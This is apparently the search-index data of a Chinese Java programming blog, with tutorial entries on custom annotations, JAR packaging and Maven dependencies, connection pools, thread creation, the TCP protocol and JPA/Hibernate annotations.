元注解的作用就是负责注解其他注解。Java5.0定义了4个标准的meta-annotation类型，它们被用来提供对其它 annotation类型作说明。Java5.0定义的元注解： @Target, @Retention, @Documented, @Inherited 下面我们看一下每个元注解的作用和相应分参数的使用说明。 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:2:0","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"2.1、@Target 表明该注解可以应用的java元素类型： Target类型 描述 ElementType.TYPE 应用于类、接口（包括注解类型）、枚举 ElementType.FIELD 应用于属性（包括枚举中的常量） ElementType.METHOD 应用于方法 ElementType.PARAMETER 应用于方法的形参 ElementType.CONSTRUCTOR 应用于构造函数 ElementType.LOCAL_VARIABLE 应用于局部变量 ElementType.ANNOTATION_TYPE 应用于注解类型 ElementType.PACKAGE 应用于包 ElementType.TYPE_PARAMETER 应用于类型变量 ElementType.TYPE_USE 应用于任何使用类型的语句中（例如声明语句、泛型和强制转换语句中的类型） ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:2:1","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"2.2、@Retention 表明该注解的生命周期 生命周期类型 描述 RetentionPolicy.SOURCE 编译时被丢弃，不包含在类文件中 RetentionPolicy.CLASS JVM加载时被丢弃，包含在类文件中，默认值 RetentionPolicy.RUNTIME 由JVM 加载，包含在类文件中，在运行时可以被获取到 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:2:2","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"2.3、@Document 表明该注解标记的元素可以被Javadoc 或类似的工具文档化。 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:2:3","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"2.4、@Inherited 表明使用了@Inherited注解的注解，所标记的类的子类也会拥有这个注解。 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:2:4","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3、自定义注解 修饰符： 访问修饰符必须为public,不写默认为pubic； 关键字： 关键字为@interface； 注解名称： 注解名称为自定义注解的名称，使用时还会用到； 注解内容： 注解中内容，对注解的描述。 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:0","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3.1 自定义注解 @Documented @Inherited @Target({ ElementType.FIELD, ElementType.METHOD ,ElementType.TYPE}) //可以在字段、枚举的常量、方法 @Retention(RetentionPolicy.RUNTIME) public @interface Init { String value() default \"\"; } ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:1","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3.2 数据模型使用注解 public class User { private String name; private String age; public String getName() { return name; } @Init(\"louis\") public User setName(String name) { this.name = name; return this; } public String getAge() { return age; } @Init(\"22\") public User setAge(String age) { this.age = age; return this; } } ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:2","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3.3 定义一个“注解解析器” public class userFactory { public static User create() { User user = new User(); // 获取User类中所有的方法（getDeclaredMethods也行） Method[] methods = User.class.getMethods(); try { for (Method method : methods) { // 如果一个注解指定注解类型是存在于此元素上此方法返回true，否则返回false //参数 -- 对应于注解类型的Class对象 if (method.isAnnotationPresent(Init.class)) { //此方法返回该元素的注解在此元素的指定注释类型（如果存在），否则返回null Init init = method.getAnnotation(Init.class); // 如果Method代表了一个方法 那么调用它的invoke就相当于执行了它代表的这个方法,在这里就是给set方法赋值 method.invoke(user, init.value()); } } } catch (Exception e) { e.printStackTrace(); return null; } return user; } } ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:3","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3.4 运行的代码 public static void main(String[] args) { User user = userFactory.create(); user.setAge(\"30\"); System.out.println(user.getName()); System.out.println(user.getAge()); } ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:4","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"3.5 结果","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:3:5","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["java后端"],"content":"什么是Jar 实现了特定功能，Java字节码文件的压缩包 本质上就是一个编译后的Java项目，打包城jar文件 log4j.jar 、mysql-connection-8.01.jar等 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:1:0","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"自己创建jar包，让别人来用： 创建Java项目 创建实现了特定功能的类 将项目生成为jar包 将jar包发布出去，给别人使用 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:2:0","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"创建项目和验证 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:0","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"创建项目 创建项目名为dateUtil的project项目 或者： 项目 dateUtil 创建完成 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:1","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"创建包和类 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:2","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"相应的代码 package com.dongyuan.util; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Date; /**日期转换工具类 * @author: XYT * @create-date: 2022/7/26 15:12 */ public class DateConvertUtil { /** 注释方法：/**+回车键 形参会被自动提取出来并加粗描黑。这就是为什么引用系统方法的时候，会有很多的说明 * 将字符串转为日期，默认格式为yyyy-MM-dd * @param strDate 字符串日期 * @return 返回转换的日期 */ public static Date getDate(String strDate){ //一个参数；对下方方法的一种封装;这种方式叫“语法糖”； return getDate(strDate,\"yyyy-MM-dd\"); //格式是默认的 getDate } /** * 将字符串转为日期类型 * @param strDate 字符串日期 * @param format 转换格式 * @return 返回转换的日期，转换失败返回null */ public static Date getDate(String strDate, String format){ //两个参数 SimpleDateFormat sdf=new SimpleDateFormat(format); //格式需要自己指定（设置） // try { //自动生成try-catch // return sdf.parse(strDate); // } catch (ParseException e) { // throw new RuntimeException(e); // } // } try { //课堂代码try-catch return sdf.parse(strDate); //注意：parse } catch (ParseException e) { e.printStackTrace(); //这里不一样 } return null; } /** * 将日期转为字符串，固定格式为yyyy-MM-dd * @param date 日期 * @return 返回转换的字符串 */ public static String getDate(Date date){ return getDate(date,\"yyyy-MM-dd\"); //格式是默认的 getDate } /** * 将日期转为字符串 * date 日期 * format 格式字符串 * 返回转换后的字符串 */ public static String getDate(Date date,String format){ //两个参数 SimpleDateFormat sdf=new SimpleDateFormat(format); //格式需要自己指定（设置） return sdf.format(date); //注意：format } } package com.dongyuan.util; /** * @author: XYT * @create-date: 2022/7/26 16:02 */ public class StringUtils { /** * 判断字符串是否为空 * @param str * @return */ public static boolean isNullOrEmpty(String str){ return str==null || str.isEmpty(); //注意 == } } ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:3","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"验证代码 package com.dongyuan.test; import com.aaa.util.DateConvertUtil; import java.util.Date; /** * @author: XYT * @create-date: 2022/7/26 16:08 */ public class Test { //测试 public static void main(String[] args) { //日期转为字符串 System.out.println(DateConvertUtil.getDate(new Date())); //日期转为固定格式的字符串 System.out.println(DateConvertUtil.getDate(new Date(),\"yyyy-MM-dd HH:mm:ss\")); } } ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:4","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"验证结果 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:3:5","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"打包和引用 选择 File 中的 Project Structure。 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:4:0","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"Project 左侧工具栏的功能 介绍 Project Structure 的工具栏及具体功能： ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:4:1","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"打 jar 包 复制生成的 jar 包到桌面，然后用解压工具打开： ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:4:2","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"导入生成的 jar 包 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:4:3","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"验证 jar 包导入 / 应用的正确性 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:4:4","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"maven项目如何使用jar包 ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:5:0","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"前言 maven作为包管理工具，好处不必多说 但是有些情况，比如需要引入第三方包，如快递鸟，支付宝，微信等jar包（当然有可能直接提供maven依赖） 如果直接下载到本地之后，怎么整合到自己的maven工程呢？ ","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:5:1","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["java后端"],"content":"下面列举五种方式 上传到maven中心仓库 https://oss.sonatype.org/ 愿意折腾可也搞搞，可以参考 如何发布Jar包到Maven中央仓库（确实比较麻烦） 如这是我手动上传到maven中央仓库的jar包 https://mvnrepository.com/search?q=chendahai 优点：可以直接在pom.xml中引入，打包部署没有问题 缺点：上传复杂，麻烦（创建工单，生成秘钥等等 搭建maven私服 手动在后台管理页面上传，之后pom.xml引入 上传方式查看 maven私服nexus上传第三方jar包以及下载 优点：下载速度快，maven聚合项目更适用，内部适用deploy即可，打包部署没有问题 缺点：相比第一种还要麻烦些，还占用本地服务器资源 传统方式java SE的套路 新建lib包，之后导入（eclipse直接build path）（idea麻烦些：File→project structure→libraries→+jar包） 优点：简单，不用做额外的配置 缺点：协作开发，多人都需做同样的操作，沟通也是一回事 pom文件scope的system属性 优点：配置后之后直接引入，maven reImport即可 缺点：没啥缺点，就是配置者得费些时间 案例 要引入如下dateUtil.jar 操作 自定义目录，这里在project的根目录新建lib文件夹，将jar放进去 pom.xml中引入 \u003cdependency\u003e \u003cgroupId\u003edingding\u003c/groupId\u003e \u003cartifactId\u003edingding\u003c/artifactId\u003e \u003cversion\u003e2.8\u003c/version\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/lib/dateUtil.jar\u003c/systemPath\u003e \u003c/dependency\u003e 注意： groupId：自定义 artifactId：自定义 version：自定义 scope：必须是system systemPath：jar包的路径（idea编写的时候会有提示的） 通过上述方式，在开发环境没有什么问题，不会存在什么包找不到等情况 但是，maven project部署一般打包发布，所以打包是需要额外配置的（上述的第一二中方式不需要做额外处理） 处理打包 打包的时候需要做如下配置，需要通过resource标签引入，位置build→resources→resource \u003cbuild\u003e \u003cresources\u003e \u003cresource\u003e \u003cdirectory\u003elib\u003c/directory\u003e \u003ctargetPath\u003e/BOOT-INF/lib/\u003c/targetPath\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.jar\u003c/include\u003e \u003c/includes\u003e \u003c/resource\u003e \u003c/resources\u003e \u003c/build\u003e directory：指定lib文件夹的位置，由于是相对工程根目录，所以直接写上lib即可 targetPath：打包到的文件夹位置，写上BOOT-INF/lib即可，或者是WEB-INF/lib。【斜杠（/）加不加都行，如果是mac的话写./】 includes：一般都是以jar结尾，就写**/*.jar 较为完整的pom.xml \u003cdependency\u003e \u003cgroupId\u003edingding\u003c/groupId\u003e \u003cartifactId\u003edingding\u003c/artifactId\u003e \u003cversion\u003e2.8\u003c/version\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/lib/taobao-sdk-java-auto_1479188381469-20190628.jar\u003c/systemPath\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003cbuild\u003e \u003cresources\u003e \u003cresource\u003e \u003cdirectory\u003elib\u003c/directory\u003e \u003ctargetPath\u003e/BOOT-INF/lib/\u003c/targetPath\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.jar\u003c/include\u003e \u003c/includes\u003e \u003c/resource\u003e \u003c/resources\u003e ok，mvn package即可。 本地安装Jar包 在本地maven仓库安装本地jar包 maven install可以把指定的文件安装到本地maven仓库（使用maven指令前需要安装apache maven）。有三种install方式： （1）mvn install:install-file -Dfile= -Dgroup","date":"2022-08-06","objectID":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/:5:2","tags":["maven","jar"],"title":"IDEA如何创建专属JAR包","uri":"/posts/idea%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%93%E5%B1%9Ejar%E5%8C%85/"},{"categories":["数据库"],"content":"​ 数据库连接是一种非常珍贵且有限的资源，尤其是在多用户的网络应用环境中更是如此。对于数据库连接管理的好坏会直接影响整个系统的性能： 建立与数据库的连接是一个耗时的操作，在页面响应中，如果每次用户请求都需要建立新的数据库连接，那么响应时间就会很长，会严重影响用户的体验‘； 数据库的连接个数是有限制的，如果管理不好用户经常建立连接却忘记释放连接，运行时间久了，数据库的连接资源就会耗尽，当有新用户需要访问数据库时，就需要等很长时间，直到有用户释放连接资源才能访问数据，这对系统的可用性有着严重的影响。 因此管理好数据库的连接资源对应用系统尤其是页面应用系统是非常重要的。 ​ 数据库连接池负责分配、管理并释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是再建立一个新的连接，同时他还负责释放空闲时间超过最大空闲时间的数据库连接，避免因为没有释放数据库连接而引起数据库连接资源遗漏。 ​ 在J2EE中，服务器在启动时会创建一定数量的连接，并维持不少于次数目的连接池，当客户程序需要访问数据库时，就可以直接从池中获取与数据库的连接(获取一个空闲的连接)，而不用去创建一个新的连接，同时将该链接状态标记为忙状态。当使用完毕后再把该连接标记为空闲状态，这样其他用户就可以重复使用这个连接了。 ​ 如果当前没有空闲连接，那么服务器就会根据配置参数在池中创建一定数量的连接。 ​ 采用这种方法对数据库连接进行管理后可以大幅度缩短用户的响应时间，提高运行效率。 ​ 另一方面，为了提高数据库操作的性能，数据库连接池会释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏。 ","date":"2021-11-03","objectID":"/posts/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/:0:0","tags":["连接池"],"title":"数据库连接池的工作原理","uri":"/posts/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"},{"categories":["java面试"],"content":"https://blog.csdn.net/xiahuale/article/details/82113929?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163452109116780271595133%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D\u0026request_id=163452109116780271595133\u0026biz_id=0\u0026utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82113929.pc_search_all_es\u0026utm_term=%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F\u0026spm=1018.2226.3001.4187 import java.util.concurrent.Callable; import java.util.concurrent.ExecutionException; import java.util.concurrent.FutureTask; public class TestThread { static class MyRunable implements Runnable{ @Override public void run() { System.out.println(\"这是一个Runable线程，执行了run方法，没有返回值，不能抛出异常\"); } } static class MyCallable implements Callable\u003cString\u003e{ @Override public String call() throws Exception { return \"这是一个Callable线程，执行了call方法，有返回值，可以抛出异常。\"; } } static class MyThread extends Thread{ public void run(){ System.out.println(\"这是一个Thread类的子类，涉及运行机制问题，影响程序性能\"); } } public static void main(String[] args) throws ExecutionException, InterruptedException { MyRunable myRunable = new MyRunable(); Thread thread = new Thread(myRunable); thread.start(); MyCallable myCallable = new MyCallable(); FutureTask\u003cString\u003e stringFutureTask = new FutureTask\u003c\u003e(myCallable); Thread thread1 = new Thread(stringFutureTask); thread1.start(); String s = stringFutureTask.get(); System.out.println(s); MyThread myThread = new MyThread(); myThread.start(); } } 运行结果 这是一个Runable线程，执行了run方法，没有返回值，不能抛出异常 这是一个Callable线程，执行了call方法，有返回值，可以抛出异常。 这是一个Thread类的子类，涉及运行机制问题，影响程序性能 ","date":"2021-11-03","objectID":"/posts/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/:0:0","tags":["线程"],"title":"创建线程的三种方式","uri":"/posts/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/"},{"categories":["java面试"],"content":"TCP(Transmission Control Protocol 传输控制协议)是一种面向连接(连接导向)的、可靠的、 基于IP的传输层协议。TCP在IP报文的协议号是6。TCP是一个超级麻烦的协议，而它又是互联网的基础，也是每个程序员必备的基本功。首先来看看OSI的七层模型: 我们需要知道TCP工作在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP 在第二层——Data Link层;在第二层上的数据，我们把它叫Frame，在第三层上的数据叫Packet，第四层的数 据叫Segment。 同时，我们需要简单的知道，数据从应用层发下来，会在每一层都会加上头部信息，进行 封装，然后再发送到数据接收端。这个基本的流程你需要知道，就是每个数据都会经过数据的封装和解封 装的过程。 在OSI七层模型中，每一层的作用和对应的协议如下： TCP是一个协议，那这个协议是如何定义的，它的数据格式是什么样子的呢?要进行更深层次的剖析，就 需要了解，甚至是熟记TCP协议中每个字段的含义。哦，来吧。 上面就是TCP协议头部的格式，由于它太重要了，是理解其它内容的基础，下面就将每个字段的信息都详 细的说明一下。 Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号;用于区别主机中的不同进程， 而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一 的确定一个TCP连接; Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据 字节在数据流中的序号;主要用来解决网络报乱序的问题; Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应 当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志(下面介绍)为1时该确认序列号的字 段才有效。主要用来解决不丢包的问题; Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit(最多能 表示15个32bit的的字，即4*15=60个字节的首部长度)，因此TCP最多有60字节的首部。然而，没有任选字段， 正常的长度是20字节; TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次 为URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下： URG：此标志表示TCP包的紧急指针域(后面马上就要说到)有效，用来保证TCP连接不被中断，并且督促 中间层设备要尽快处理这些数据; ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中;有两个取值：0和1， 为1的时候表示应答域有效，反之为0; PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序， 而不是在缓冲区中排队; RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包; SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1， ACK=0;连接被响应的时候，SYN=1，ACK=1;这个标志的数据包经常被用来进行端口扫描。扫描者发送 一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口;但是由于这 种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全 的主机将会强制要求一个连接严格的进行TCP的三次握手; FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志 位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。 Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制;这是一个复杂的问题，这篇博文中并不会进行 总结的; 好了，基本知识都已经准备好了，开始下一段的征程吧。 三次握手又是什么? TCP是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP/IP协议中，TCP 协议提供可靠的连接服务，连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号 并交换 TCP窗口大小信息。这就是面试中经常会被问到的TCP三次握手。只是了解TCP三次握手的 概念，对你获得一份工作是没有任何帮助的，你需要去了解TCP三次握手中的一些细节。先来看图说话。 多么清晰的一张图，当然了，也不是我画的，我也只是引用过来说明问题了。","date":"2021-08-30","objectID":"/posts/tcp%E5%8D%8F%E8%AE%AE/:0:0","tags":["TCP"],"title":"TCP协议","uri":"/posts/tcp%E5%8D%8F%E8%AE%AE/"},{"categories":["java后端"],"content":"JPA和Hibernate的关系 JPA（Java Persistence API），是Java EE 5的标准ORM接口，也是ejb3规范的一部分。 Hibernate是之前很流行的ORM框架，也是JPA的一个实现，其它还有Toplink之类的ROM框架。 JPA和Hibernate之间的关系，可以简单的理解为JPA是标准接口，Hibernate是实现。 Hibernate主要是通过三个组件来实现的： hibernate-core：Hibernate的核心实现，提供了Hibernate所有的核心功能。 hibernate-entitymanager：Hibernate实现了标准的JPA，可以把它看成hibernate-core和JPA之间的适配器，它并不直接提供ORM的功能，而是对hibernate-core进行封装，使得Hibernate符合JPA的规范。 hibernate-annotation：Hibernate支持annotation方式配置的基础，它包括了标准的JPA annotation以及Hibernate自身特殊功能的annotation。 Entity @Entity说明这个class是实体类，并且使用默认的orm规则，即class名对应数据库表中表名，class字段名即表中的字段名。 （如果想改变这种默认的orm规则，就要使用@Table来改变class名与数据库中表名的映射规则，@Column来改变class中字段名与db中表的字段名的映射规则） 元数据属性说明： • name: 表名 下面的代码说明,Customer类对应数据库中的Customer表，其中name为可选，缺省类名即表名！ @Entity(name=”Customer”) public class Customer { ... } Table Table用来定义entity主表的name，catalog，schema等属性。 元数据属性说明： • name: 表名 • catalog: 对应关系数据库中的catalog • schema：对应关系数据库中的schema • UniqueConstraints:定义一个UniqueConstraint数组，指定需要建唯一约束的列 @Entity @Table() public class Customer { ... } SecondaryTable 一个entity class可以映射到多表，SecondaryTable用来定义单个从表的名字，主键名字等属性。 元数据属性说明： • name: 表名 • catalog: 对应关系数据库中的catalog • schema：对应关系数据库中的schema • pkJoin: 定义一个PrimaryKeyJoinColumn数组，指定从表的主键列 • UniqueConstraints: 定义一个UniqueConstraint数组，指定需要建唯一约束的列 下面的代码说明Customer类映射到两个表，主表名是CUSTOMER，从表名是CUST_DETAIL，从表的主键列和主表的主键列类型相同，列名为CUST_ID。 @Entity @Table() @SecondaryTable(,pkJoin=@PrimaryKeyJoinColumn()) public class Customer { ... } SecondaryTables 当一个entity class映射到一个主表和多个从表时，用SecondaryTables来定义各个从表的属性。 元数据属性说明： • value： 定义一个SecondaryTable数组，指定每个从表的属性。 @Table(name = \"CUSTOMER\") @SecondaryTables( value = { @SecondaryTable(name = \"CUST_NAME\", pkJoin = { @PrimaryKeyJoinColumn(name = \"STMO_ID\", referencedColumnName = \"id\") }), @SecondaryTable(name = \"CUST_ADDRESS\", pkJoin = { @PrimaryKeyJoinColumn(name = \"STMO_ID\", referencedColumnName = \"id\") }) }) public class Customer {} UniqueConstraint UniqueConstraint定义在Table或SecondaryTable元数据里，用来指定建表时需要建唯一约束的列。 元数据属性说明： • columnNames:定义一个字符串数组，指定要建唯一约束的列名。 